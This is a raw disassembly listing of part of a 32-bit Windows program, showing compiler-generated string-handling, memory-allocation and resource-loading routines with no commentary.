  401c37:	72 02                	jb     0x401c3b
  401c39:	8b 00                	mov    (%eax),%eax
  401c3b:	33 d2                	xor    %edx,%edx
  401c3d:	66 89 10             	mov    %dx,(%eax)
  401c40:	33 c0                	xor    %eax,%eax
  401c42:	3b c6                	cmp    %esi,%eax
  401c44:	1b c0                	sbb    %eax,%eax
  401c46:	f7 d8                	neg    %eax
  401c48:	c3                   	ret
  401c49:	cc                   	int3
  401c4a:	cc                   	int3
  401c4b:	cc                   	int3
  401c4c:	cc                   	int3
  401c4d:	cc                   	int3
  401c4e:	cc                   	int3
  401c4f:	cc                   	int3
  401c50:	57                   	push   %edi
  401c51:	8b f8                	mov    %eax,%edi
  401c53:	8b 46 10             	mov    0x10(%esi),%eax
  401c56:	3b c1                	cmp    %ecx,%eax
  401c58:	73 0a                	jae    0x401c64
  401c5a:	68 a8 d2 40 00       	push   $0x40d2a8
  401c5f:	e8 72 10 00 00       	call   0x402cd6
  401c64:	2b c1                	sub    %ecx,%eax
  401c66:	3b c7                	cmp    %edi,%eax
  401c68:	73 02                	jae    0x401c6c
  401c6a:	8b f8                	mov    %eax,%edi
  401c6c:	85 ff                	test   %edi,%edi
  401c6e:	74 4c                	je     0x401cbc
  401c70:	8b 56 14             	mov    0x14(%esi),%edx
  401c73:	53                   	push   %ebx
  401c74:	83 fa 10             	cmp    $0x10,%edx
  401c77:	72 04                	jb     0x401c7d
  401c79:	8b 1e                	mov    (%esi),%ebx
  401c7b:	eb 02                	jmp    0x401c7f
  401c7d:	8b de                	mov    %esi,%ebx
  401c7f:	83 fa 10             	cmp    $0x10,%edx
  401c82:	72 04                	jb     0x401c88
  401c84:	8b 16                	mov    (%esi),%edx
  401c86:	eb 02                	jmp    0x401c8a
  401c88:	8b d6                	mov    %esi,%edx
  401c8a:	2b c7                	sub    %edi,%eax
  401c8c:	03 d9                	add    %ecx,%ebx
  401c8e:	50                   	push   %eax
  401c8f:	03 df                	add    %edi,%ebx
  401c91:	03 d1                	add    %ecx,%edx
  401c93:	53                   	push   %ebx
  401c94:	52                   	push   %edx
  401c95:	e8 a6 16 00 00       	call   0x403340
  401c9a:	8b 46 10             	mov    0x10(%esi),%eax
  401c9d:	83 c4 0c             	add    $0xc,%esp
  401ca0:	2b c7                	sub    %edi,%eax
  401ca2:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  401ca6:	89 46 10             	mov    %eax,0x10(%esi)
  401ca9:	5b                   	pop    %ebx
  401caa:	72 0a                	jb     0x401cb6
  401cac:	8b 0e                	mov    (%esi),%ecx
  401cae:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  401cb2:	8b c6                	mov    %esi,%eax
  401cb4:	5f                   	pop    %edi
  401cb5:	c3                   	ret
  401cb6:	8b ce                	mov    %esi,%ecx
  401cb8:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  401cbc:	8b c6                	mov    %esi,%eax
  401cbe:	5f                   	pop    %edi
  401cbf:	c3                   	ret
  401cc0:	55                   	push   %ebp
  401cc1:	8b ec                	mov    %esp,%ebp
  401cc3:	6a ff                	push   $0xffffffff
  401cc5:	68 b0 a3 40 00       	push   $0x40a3b0
  401cca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401cd0:	50                   	push   %eax
  401cd1:	83 ec 18             	sub    $0x18,%esp
  401cd4:	53                   	push   %ebx
  401cd5:	56                   	push   %esi
  401cd6:	57                   	push   %edi
  401cd7:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  401cdc:	33 c5                	xor    %ebp,%eax
  401cde:	50                   	push   %eax
  401cdf:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401ce2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401ce8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401ceb:	8b 45 0c             	mov    0xc(%ebp),%eax
  401cee:	8b 7d 08             	mov    0x8(%ebp),%edi
  401cf1:	8b f0                	mov    %eax,%esi
  401cf3:	83 ce 0f             	or     $0xf,%esi
  401cf6:	83 fe fe             	cmp    $0xfffffffe,%esi
  401cf9:	76 04                	jbe    0x401cff
  401cfb:	8b f0                	mov    %eax,%esi
  401cfd:	eb 27                	jmp    0x401d26
  401cff:	8b 5f 14             	mov    0x14(%edi),%ebx
  401d02:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  401d07:	f7 e6                	mul    %esi
  401d09:	8b cb                	mov    %ebx,%ecx
  401d0b:	d1 e9                	shr    $1,%ecx
  401d0d:	d1 ea                	shr    $1,%edx
  401d0f:	3b ca                	cmp    %edx,%ecx
  401d11:	76 13                	jbe    0x401d26
  401d13:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  401d18:	2b c1                	sub    %ecx,%eax
  401d1a:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  401d1d:	3b d8                	cmp    %eax,%ebx
  401d1f:	76 05                	jbe    0x401d26
  401d21:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  401d26:	33 c0                	xor    %eax,%eax
  401d28:	8d 4e 01             	lea    0x1(%esi),%ecx
  401d2b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d2e:	3b c8                	cmp    %eax,%ecx
  401d30:	76 12                	jbe    0x401d44
  401d32:	83 f9 ff             	cmp    $0xffffffff,%ecx
  401d35:	77 12                	ja     0x401d49
  401d37:	51                   	push   %ecx
  401d38:	e8 64 19 00 00       	call   0x4036a1
  401d3d:	83 c4 04             	add    $0x4,%esp
  401d40:	85 c0                	test   %eax,%eax
  401d42:	74 05                	je     0x401d49
  401d44:	89 45 0c             	mov    %eax,0xc(%ebp)
  401d47:	eb 4c                	jmp    0x401d95
  401d49:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401d4c:	51                   	push   %ecx
  401d4d:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401d50:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401d57:	e8 7f 14 00 00       	call   0x4031db
  401d5c:	68 f4 da 40 00       	push   $0x40daf4
  401d61:	8d 55 dc             	lea    -0x24(%ebp),%edx
  401d64:	52                   	push   %edx
  401d65:	c7 45 dc a8 b2 40 00 	movl   $0x40b2a8,-0x24(%ebp)
  401d6c:	e8 ee 1d 00 00       	call   0x403b5f
  401d71:	8b 45 0c             	mov    0xc(%ebp),%eax
  401d74:	8d 48 01             	lea    0x1(%eax),%ecx
  401d77:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401d7a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401d7d:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  401d81:	e8 4a 03 00 00       	call   0x4020d0
  401d86:	89 45 0c             	mov    %eax,0xc(%ebp)
  401d89:	b8 8f 1d 40 00       	mov    $0x401d8f,%eax
  401d8e:	c3                   	ret
  401d8f:	8b 7d 08             	mov    0x8(%ebp),%edi
  401d92:	8b 75 e8             	mov    -0x18(%ebp),%esi
  401d95:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401d98:	85 db                	test   %ebx,%ebx
  401d9a:	74 1a                	je     0x401db6
  401d9c:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  401da0:	72 04                	jb     0x401da6
  401da2:	8b 07                	mov    (%edi),%eax
  401da4:	eb 02                	jmp    0x401da8
  401da6:	8b c7                	mov    %edi,%eax
  401da8:	53                   	push   %ebx
  401da9:	50                   	push   %eax
  401daa:	8b 45 0c             	mov    0xc(%ebp),%eax
  401dad:	50                   	push   %eax
  401dae:	e8 bd 1f 00 00       	call   0x403d70
  401db3:	83 c4 0c             	add    $0xc,%esp
  401db6:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  401dba:	72 0b                	jb     0x401dc7
  401dbc:	8b 0f                	mov    (%edi),%ecx
  401dbe:	51                   	push   %ecx
  401dbf:	e8 af 12 00 00       	call   0x403073
  401dc4:	83 c4 04             	add    $0x4,%esp
  401dc7:	8b 45 0c             	mov    0xc(%ebp),%eax
  401dca:	c6 07 00             	movb   $0x0,(%edi)
  401dcd:	89 07                	mov    %eax,(%edi)
  401dcf:	89 77 14             	mov    %esi,0x14(%edi)
  401dd2:	89 5f 10             	mov    %ebx,0x10(%edi)
  401dd5:	83 fe 10             	cmp    $0x10,%esi
  401dd8:	72 02                	jb     0x401ddc
  401dda:	8b f8                	mov    %eax,%edi
  401ddc:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
  401de0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401de3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401dea:	59                   	pop    %ecx
  401deb:	5f                   	pop    %edi
  401dec:	5e                   	pop    %esi
  401ded:	5b                   	pop    %ebx
  401dee:	8b e5                	mov    %ebp,%esp
  401df0:	5d                   	pop    %ebp
  401df1:	c2 0c 00             	ret    $0xc
  401df4:	8b 75 08             	mov    0x8(%ebp),%esi
  401df7:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  401dfb:	72 0b                	jb     0x401e08
  401dfd:	8b 16                	mov    (%esi),%edx
  401dff:	52                   	push   %edx
  401e00:	e8 6e 12 00 00       	call   0x403073
  401e05:	83 c4 04             	add    $0x4,%esp
  401e08:	6a 00                	push   $0x0
  401e0a:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  401e11:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  401e18:	6a 00                	push   $0x0
  401e1a:	c6 06 00             	movb   $0x0,(%esi)
  401e1d:	e8 3d 1d 00 00       	call   0x403b5f
  401e22:	cc                   	int3
  401e23:	cc                   	int3
  401e24:	cc                   	int3
  401e25:	cc                   	int3
  401e26:	cc                   	int3
  401e27:	cc                   	int3
  401e28:	cc                   	int3
  401e29:	cc                   	int3
  401e2a:	cc                   	int3
  401e2b:	cc                   	int3
  401e2c:	cc                   	int3
  401e2d:	cc                   	int3
  401e2e:	cc                   	int3
  401e2f:	cc                   	int3
  401e30:	55                   	push   %ebp
  401e31:	8b ec                	mov    %esp,%ebp
  401e33:	8b 55 08             	mov    0x8(%ebp),%edx
  401e36:	53                   	push   %ebx
  401e37:	56                   	push   %esi
  401e38:	8b f0                	mov    %eax,%esi
  401e3a:	c1 e8 04             	shr    $0x4,%eax
  401e3d:	40                   	inc    %eax
  401e3e:	0f b7 c8             	movzwl %ax,%ecx
  401e41:	6a 06                	push   $0x6
  401e43:	51                   	push   %ecx
  401e44:	52                   	push   %edx
  401e45:	ff 15 3c b0 40 00    	call   *0x40b03c
  401e4b:	8b d8                	mov    %eax,%ebx
  401e4d:	85 db                	test   %ebx,%ebx
  401e4f:	74 14                	je     0x401e65
  401e51:	8b 45 08             	mov    0x8(%ebp),%eax
  401e54:	50                   	push   %eax
  401e55:	8b c6                	mov    %esi,%eax
  401e57:	e8 64 f6 ff ff       	call   0x4014c0
  401e5c:	8b f0                	mov    %eax,%esi
  401e5e:	83 c4 04             	add    $0x4,%esp
  401e61:	85 f6                	test   %esi,%esi
  401e63:	75 08                	jne    0x401e6d
  401e65:	5e                   	pop    %esi
  401e66:	33 c0                	xor    %eax,%eax
  401e68:	5b                   	pop    %ebx
  401e69:	5d                   	pop    %ebp
  401e6a:	c2 04 00             	ret    $0x4
  401e6d:	0f b7 1e             	movzwl (%esi),%ebx
  401e70:	85 db                	test   %ebx,%ebx
  401e72:	79 0a                	jns    0x401e7e
  401e74:	68 57 00 07 80       	push   $0x80070057
  401e79:	e8 82 f1 ff ff       	call   0x401000
  401e7e:	8b 07                	mov    (%edi),%eax
  401e80:	8b 50 f8             	mov    -0x8(%eax),%edx
  401e83:	b9 01 00 00 00       	mov    $0x1,%ecx
  401e88:	2b 48 fc             	sub    -0x4(%eax),%ecx
  401e8b:	2b d3                	sub    %ebx,%edx
  401e8d:	0b ca                	or     %edx,%ecx
  401e8f:	7d 09                	jge    0x401e9a
  401e91:	8b c3                	mov    %ebx,%eax
  401e93:	8b cf                	mov    %edi,%ecx
  401e95:	e8 86 02 00 00       	call   0x402120
  401e9a:	0f b7 06             	movzwl (%esi),%eax
  401e9d:	8b 0f                	mov    (%edi),%ecx
  401e9f:	53                   	push   %ebx
  401ea0:	83 c6 02             	add    $0x2,%esi
  401ea3:	51                   	push   %ecx
  401ea4:	e8 47 f7 ff ff       	call   0x4015f0
  401ea9:	8b 07                	mov    (%edi),%eax
  401eab:	83 c4 08             	add    $0x8,%esp
  401eae:	3b 58 f8             	cmp    -0x8(%eax),%ebx
  401eb1:	7f c1                	jg     0x401e74
  401eb3:	89 58 f4             	mov    %ebx,-0xc(%eax)
  401eb6:	8b 17                	mov    (%edi),%edx
  401eb8:	33 c0                	xor    %eax,%eax
  401eba:	66 89 04 5a          	mov    %ax,(%edx,%ebx,2)
  401ebe:	5e                   	pop    %esi
  401ebf:	b8 01 00 00 00       	mov    $0x1,%eax
  401ec4:	5b                   	pop    %ebx
  401ec5:	5d                   	pop    %ebp
  401ec6:	c2 04 00             	ret    $0x4
  401ec9:	cc                   	int3
  401eca:	cc                   	int3
  401ecb:	cc                   	int3
  401ecc:	cc                   	int3
  401ecd:	cc                   	int3
  401ece:	cc                   	int3
  401ecf:	cc                   	int3
  401ed0:	57                   	push   %edi
  401ed1:	8b f8                	mov    %eax,%edi
  401ed3:	8b 46 10             	mov    0x10(%esi),%eax
  401ed6:	3b c1                	cmp    %ecx,%eax
  401ed8:	73 0a                	jae    0x401ee4
  401eda:	68 a8 d2 40 00       	push   $0x40d2a8
  401edf:	e8 f2 0d 00 00       	call   0x402cd6
  401ee4:	2b c1                	sub    %ecx,%eax
  401ee6:	3b c7                	cmp    %edi,%eax
  401ee8:	73 02                	jae    0x401eec
  401eea:	8b f8                	mov    %eax,%edi
  401eec:	85 ff                	test   %edi,%edi
  401eee:	74 55                	je     0x401f45
  401ef0:	8b 56 14             	mov    0x14(%esi),%edx
  401ef3:	53                   	push   %ebx
  401ef4:	83 fa 08             	cmp    $0x8,%edx
  401ef7:	72 04                	jb     0x401efd
  401ef9:	8b 1e                	mov    (%esi),%ebx
  401efb:	eb 02                	jmp    0x401eff
  401efd:	8b de                	mov    %esi,%ebx
  401eff:	83 fa 08             	cmp    $0x8,%edx
  401f02:	72 04                	jb     0x401f08
  401f04:	8b 16                	mov    (%esi),%edx
  401f06:	eb 02                	jmp    0x401f0a
  401f08:	8b d6                	mov    %esi,%edx
  401f0a:	2b c7                	sub    %edi,%eax
  401f0c:	03 c0                	add    %eax,%eax
  401f0e:	50                   	push   %eax
  401f0f:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  401f12:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  401f15:	50                   	push   %eax
  401f16:	8d 0c 4a             	lea    (%edx,%ecx,2),%ecx
  401f19:	51                   	push   %ecx
  401f1a:	e8 21 14 00 00       	call   0x403340
  401f1f:	8b 46 10             	mov    0x10(%esi),%eax
  401f22:	83 c4 0c             	add    $0xc,%esp
  401f25:	2b c7                	sub    %edi,%eax
  401f27:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  401f2b:	89 46 10             	mov    %eax,0x10(%esi)
  401f2e:	5b                   	pop    %ebx
  401f2f:	72 0c                	jb     0x401f3d
  401f31:	8b 0e                	mov    (%esi),%ecx
  401f33:	33 d2                	xor    %edx,%edx
  401f35:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  401f39:	8b c6                	mov    %esi,%eax
  401f3b:	5f                   	pop    %edi
  401f3c:	c3                   	ret
  401f3d:	8b ce                	mov    %esi,%ecx
  401f3f:	33 d2                	xor    %edx,%edx
  401f41:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  401f45:	8b c6                	mov    %esi,%eax
  401f47:	5f                   	pop    %edi
  401f48:	c3                   	ret
  401f49:	cc                   	int3
  401f4a:	cc                   	int3
  401f4b:	cc                   	int3
  401f4c:	cc                   	int3
  401f4d:	cc                   	int3
  401f4e:	cc                   	int3
  401f4f:	cc                   	int3
  401f50:	cc                   	int3
  401f51:	cc                   	int3
  401f52:	cc                   	int3
  401f53:	cc                   	int3
  401f54:	cc                   	int3
  401f55:	cc                   	int3
  401f56:	cc                   	int3
  401f57:	cc                   	int3
  401f58:	cc                   	int3
  401f59:	cc                   	int3
  401f5a:	cc                   	int3
  401f5b:	cc                   	int3
  401f5c:	cc                   	int3
  401f5d:	cc                   	int3
  401f5e:	cc                   	int3
  401f5f:	cc                   	int3
  401f60:	55                   	push   %ebp
  401f61:	8b ec                	mov    %esp,%ebp
  401f63:	6a ff                	push   $0xffffffff
  401f65:	68 90 a3 40 00       	push   $0x40a390
  401f6a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f70:	50                   	push   %eax
  401f71:	83 ec 14             	sub    $0x14,%esp
  401f74:	53                   	push   %ebx
  401f75:	56                   	push   %esi
  401f76:	57                   	push   %edi
  401f77:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  401f7c:	33 c5                	xor    %ebp,%eax
  401f7e:	50                   	push   %eax
  401f7f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401f82:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401f88:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401f8b:	8b 45 0c             	mov    0xc(%ebp),%eax
  401f8e:	8b 7d 08             	mov    0x8(%ebp),%edi
  401f91:	8b f0                	mov    %eax,%esi
  401f93:	83 ce 07             	or     $0x7,%esi
  401f96:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  401f9c:	76 04                	jbe    0x401fa2
  401f9e:	8b f0                	mov    %eax,%esi
  401fa0:	eb 27                	jmp    0x401fc9
  401fa2:	8b 5f 14             	mov    0x14(%edi),%ebx
  401fa5:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  401faa:	f7 e6                	mul    %esi
  401fac:	8b cb                	mov    %ebx,%ecx
  401fae:	d1 e9                	shr    $1,%ecx
  401fb0:	d1 ea                	shr    $1,%edx
  401fb2:	3b ca                	cmp    %edx,%ecx
  401fb4:	76 13                	jbe    0x401fc9
  401fb6:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  401fbb:	2b c1                	sub    %ecx,%eax
  401fbd:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  401fc0:	3b d8                	cmp    %eax,%ebx
  401fc2:	76 05                	jbe    0x401fc9
  401fc4:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  401fc9:	33 c0                	xor    %eax,%eax
  401fcb:	8d 4e 01             	lea    0x1(%esi),%ecx
  401fce:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401fd1:	3b c8                	cmp    %eax,%ecx
  401fd3:	76 17                	jbe    0x401fec
  401fd5:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  401fdb:	77 13                	ja     0x401ff0
  401fdd:	03 c9                	add    %ecx,%ecx
  401fdf:	51                   	push   %ecx
  401fe0:	e8 bc 16 00 00       	call   0x4036a1
  401fe5:	83 c4 04             	add    $0x4,%esp
  401fe8:	85 c0                	test   %eax,%eax
  401fea:	74 04                	je     0x401ff0
  401fec:	8b d8                	mov    %eax,%ebx
  401fee:	eb 4f                	jmp    0x40203f
  401ff0:	8d 55 ec             	lea    -0x14(%ebp),%edx
  401ff3:	52                   	push   %edx
  401ff4:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401ff7:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401ffe:	e8 d8 11 00 00       	call   0x4031db
  402003:	68 f4 da 40 00       	push   $0x40daf4
  402008:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40200b:	50                   	push   %eax
  40200c:	c7 45 e0 a8 b2 40 00 	movl   $0x40b2a8,-0x20(%ebp)
  402013:	e8 47 1b 00 00       	call   0x403b5f
  402018:	8b 45 0c             	mov    0xc(%ebp),%eax
  40201b:	8d 48 01             	lea    0x1(%eax),%ecx
  40201e:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402021:	89 45 0c             	mov    %eax,0xc(%ebp)
  402024:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402028:	e8 53 01 00 00       	call   0x402180
  40202d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402030:	b8 36 20 40 00       	mov    $0x402036,%eax
  402035:	c3                   	ret
  402036:	8b 7d 08             	mov    0x8(%ebp),%edi
  402039:	8b 75 0c             	mov    0xc(%ebp),%esi
  40203c:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  40203f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402042:	85 c9                	test   %ecx,%ecx
  402044:	74 1c                	je     0x402062
  402046:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  40204a:	72 04                	jb     0x402050
  40204c:	8b 07                	mov    (%edi),%eax
  40204e:	eb 02                	jmp    0x402052
  402050:	8b c7                	mov    %edi,%eax
  402052:	03 c9                	add    %ecx,%ecx
  402054:	51                   	push   %ecx
  402055:	50                   	push   %eax
  402056:	53                   	push   %ebx
  402057:	e8 14 1d 00 00       	call   0x403d70
  40205c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40205f:	83 c4 0c             	add    $0xc,%esp
  402062:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  402066:	72 0e                	jb     0x402076
  402068:	8b 17                	mov    (%edi),%edx
  40206a:	52                   	push   %edx
  40206b:	e8 03 10 00 00       	call   0x403073
  402070:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402073:	83 c4 04             	add    $0x4,%esp
  402076:	89 1f                	mov    %ebx,(%edi)
  402078:	89 77 14             	mov    %esi,0x14(%edi)
  40207b:	89 4f 10             	mov    %ecx,0x10(%edi)
  40207e:	83 fe 08             	cmp    $0x8,%esi
  402081:	72 02                	jb     0x402085
  402083:	8b fb                	mov    %ebx,%edi
  402085:	33 d2                	xor    %edx,%edx
  402087:	66 89 14 4f          	mov    %dx,(%edi,%ecx,2)
  40208b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40208e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402095:	59                   	pop    %ecx
  402096:	5f                   	pop    %edi
  402097:	5e                   	pop    %esi
  402098:	5b                   	pop    %ebx
  402099:	8b e5                	mov    %ebp,%esp
  40209b:	5d                   	pop    %ebp
  40209c:	c2 0c 00             	ret    $0xc
  40209f:	8b 75 08             	mov    0x8(%ebp),%esi
  4020a2:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4020a6:	72 0b                	jb     0x4020b3
  4020a8:	8b 06                	mov    (%esi),%eax
  4020aa:	50                   	push   %eax
  4020ab:	e8 c3 0f 00 00       	call   0x403073
  4020b0:	83 c4 04             	add    $0x4,%esp
  4020b3:	33 c9                	xor    %ecx,%ecx
  4020b5:	51                   	push   %ecx
  4020b6:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4020bd:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4020c4:	51                   	push   %ecx
  4020c5:	66 89 0e             	mov    %cx,(%esi)
  4020c8:	e8 92 1a 00 00       	call   0x403b5f
  4020cd:	cc                   	int3
  4020ce:	cc                   	int3
  4020cf:	cc                   	int3
  4020d0:	55                   	push   %ebp
  4020d1:	8b ec                	mov    %esp,%ebp
  4020d3:	83 ec 10             	sub    $0x10,%esp
  4020d6:	33 c0                	xor    %eax,%eax
  4020d8:	85 c9                	test   %ecx,%ecx
  4020da:	74 3a                	je     0x402116
  4020dc:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4020df:	77 0d                	ja     0x4020ee
  4020e1:	51                   	push   %ecx
  4020e2:	e8 ba 15 00 00       	call   0x4036a1
  4020e7:	83 c4 04             	add    $0x4,%esp
  4020ea:	85 c0                	test   %eax,%eax
  4020ec:	75 28                	jne    0x402116
  4020ee:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4020f1:	50                   	push   %eax
  4020f2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4020f5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4020fc:	e8 da 10 00 00       	call   0x4031db
  402101:	68 f4 da 40 00       	push   $0x40daf4
  402106:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402109:	51                   	push   %ecx
  40210a:	c7 45 f0 a8 b2 40 00 	movl   $0x40b2a8,-0x10(%ebp)
  402111:	e8 49 1a 00 00       	call   0x403b5f
  402116:	8b e5                	mov    %ebp,%esp
  402118:	5d                   	pop    %ebp
  402119:	c3                   	ret
  40211a:	cc                   	int3
  40211b:	cc                   	int3
  40211c:	cc                   	int3
  40211d:	cc                   	int3
  40211e:	cc                   	int3
  40211f:	cc                   	int3
  402120:	56                   	push   %esi
  402121:	8b f1                	mov    %ecx,%esi
  402123:	57                   	push   %edi
  402124:	8b f8                	mov    %eax,%edi
  402126:	8b 06                	mov    (%esi),%eax
  402128:	8b 48 f4             	mov    -0xc(%eax),%ecx
  40212b:	3b cf                	cmp    %edi,%ecx
  40212d:	7e 02                	jle    0x402131
  40212f:	8b f9                	mov    %ecx,%edi
  402131:	83 78 fc 01          	cmpl   $0x1,-0x4(%eax)
  402135:	7e 0a                	jle    0x402141
  402137:	57                   	push   %edi
  402138:	56                   	push   %esi
  402139:	e8 92 00 00 00       	call   0x4021d0
  40213e:	5f                   	pop    %edi
  40213f:	5e                   	pop    %esi
  402140:	c3                   	ret
  402141:	8b 40 f8             	mov    -0x8(%eax),%eax
  402144:	3b c7                	cmp    %edi,%eax
  402146:	7d 26                	jge    0x40216e
  402148:	8b c8                	mov    %eax,%ecx
  40214a:	81 f9 00 00 00 40    	cmp    $0x40000000,%ecx
  402150:	7e 08                	jle    0x40215a
  402152:	81 c1 00 00 10 00    	add    $0x100000,%ecx
  402158:	eb 07                	jmp    0x402161
  40215a:	99                   	cltd
  40215b:	2b c2                	sub    %edx,%eax
  40215d:	d1 f8                	sar    $1,%eax
  40215f:	03 c8                	add    %eax,%ecx
  402161:	3b cf                	cmp    %edi,%ecx
  402163:	7d 02                	jge    0x402167
  402165:	8b cf                	mov    %edi,%ecx
  402167:	8b d1                	mov    %ecx,%edx
  402169:	e8 f2 00 00 00       	call   0x402260
  40216e:	5f                   	pop    %edi
  40216f:	5e                   	pop    %esi
  402170:	c3                   	ret
  402171:	cc                   	int3
  402172:	cc                   	int3
  402173:	cc                   	int3
  402174:	cc                   	int3
  402175:	cc                   	int3
  402176:	cc                   	int3
  402177:	cc                   	int3
  402178:	cc                   	int3
  402179:	cc                   	int3
  40217a:	cc                   	int3
  40217b:	cc                   	int3
  40217c:	cc                   	int3
  40217d:	cc                   	int3
  40217e:	cc                   	int3
  40217f:	cc                   	int3
  402180:	55                   	push   %ebp
  402181:	8b ec                	mov    %esp,%ebp
  402183:	83 ec 10             	sub    $0x10,%esp
  402186:	33 c0                	xor    %eax,%eax
  402188:	85 c9                	test   %ecx,%ecx
  40218a:	74 40                	je     0x4021cc
  40218c:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  402192:	77 10                	ja     0x4021a4
  402194:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  402197:	50                   	push   %eax
  402198:	e8 04 15 00 00       	call   0x4036a1
  40219d:	83 c4 04             	add    $0x4,%esp
  4021a0:	85 c0                	test   %eax,%eax
  4021a2:	75 28                	jne    0x4021cc
  4021a4:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4021a7:	51                   	push   %ecx
  4021a8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4021ab:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4021b2:	e8 24 10 00 00       	call   0x4031db
  4021b7:	68 f4 da 40 00       	push   $0x40daf4
  4021bc:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4021bf:	52                   	push   %edx
  4021c0:	c7 45 f0 a8 b2 40 00 	movl   $0x40b2a8,-0x10(%ebp)
  4021c7:	e8 93 19 00 00       	call   0x403b5f
  4021cc:	8b e5                	mov    %ebp,%esp
  4021ce:	5d                   	pop    %ebp
  4021cf:	c3                   	ret
  4021d0:	55                   	push   %ebp
  4021d1:	8b ec                	mov    %esp,%ebp
  4021d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4021d6:	53                   	push   %ebx
  4021d7:	56                   	push   %esi
  4021d8:	8b 30                	mov    (%eax),%esi
  4021da:	8b 4e f0             	mov    -0x10(%esi),%ecx
  4021dd:	8b 11                	mov    (%ecx),%edx
  4021df:	8b 42 10             	mov    0x10(%edx),%eax
  4021e2:	8b 5e f4             	mov    -0xc(%esi),%ebx
  4021e5:	83 ee 10             	sub    $0x10,%esi
  4021e8:	57                   	push   %edi
  4021e9:	ff d0                	call   *%eax
  4021eb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4021ee:	8b 10                	mov    (%eax),%edx
  4021f0:	8b 12                	mov    (%edx),%edx
  4021f2:	6a 02                	push   $0x2
  4021f4:	51                   	push   %ecx
  4021f5:	8b c8                	mov    %eax,%ecx
  4021f7:	ff d2                	call   *%edx
  4021f9:	8b f8                	mov    %eax,%edi
  4021fb:	85 ff                	test   %edi,%edi
  4021fd:	75 05                	jne    0x402204
  4021ff:	e8 fc f0 ff ff       	call   0x401300
  402204:	8b 45 0c             	mov    0xc(%ebp),%eax
  402207:	3b d8                	cmp    %eax,%ebx
  402209:	7d 02                	jge    0x40220d
  40220b:	8b c3                	mov    %ebx,%eax
  40220d:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  402211:	50                   	push   %eax
  402212:	8d 56 10             	lea    0x10(%esi),%edx
  402215:	52                   	push   %edx
  402216:	8d 4f 10             	lea    0x10(%edi),%ecx
  402219:	50                   	push   %eax
  40221a:	51                   	push   %ecx
